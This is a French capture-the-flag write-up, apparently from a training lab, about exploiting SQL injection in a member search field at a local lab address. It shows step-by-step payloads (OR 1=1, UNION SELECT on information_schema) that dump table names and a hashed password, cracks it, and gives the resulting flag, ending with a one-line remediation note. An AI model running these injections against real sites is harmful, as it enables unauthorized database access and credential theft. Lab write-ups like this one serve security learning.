sur http://192.168.99.102/?page=member

On peu voir un field pour rechercher par Id.

Si on entre 1 OR 1 = 1:
First name: Flag
Surname : GetThe

On peux voir qu'un first name est "Flag"

Avec la requete suivante: 
```sql
1 AND MID(VERSION(),1,1) = 5;
```

On obtiens la version de mysql... pas utile 


Avec la requete suivante: 
```sql
1 UNION SELECT * FROM Users
```

on obtiens une erreur: Table 'Member_Sql_Injection.Users' doesn't exist
on en deduis le nom de la db: Member_Sql_Injection


```sql
1 UNION SELECT * FROM Users
1 AND 1=2 UNION SELECT * FROM information_schema.columns
```

Nous avons une erreur:
The used SELECT statements have a different number of columns

parce que "select * from ..." est la sélection de toutes les colonnes du tableau des users.
c'est pourquoi lorsque nous avons essayé d'unir plus de 2 colonnes avec elle, nous avons cette erreur.

En essayant de select que deux colonnes avec cette commande:
```sql
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

Nous affiche toutes les tables et colonnes
On peux voir la table qui nous interesse ici c'est: Users
qui contient les colonnes suivantes:
user_id
first_name
last_name
town
country
planet
Commentaire
countersign

testons alors les deux dernieres qui ont l'air suspectes.... :

```sql
1 AND 1 = 2 UNION SELECT countersign, Commentaire FROM users
```
bingo !


```
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !


5ff9d0165b4f92b14994e5c685cdce28: FortyTwo
=> lower + sh256 = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

### Amelioration

Gerer les sqli, protegers les strings envoyer en request.


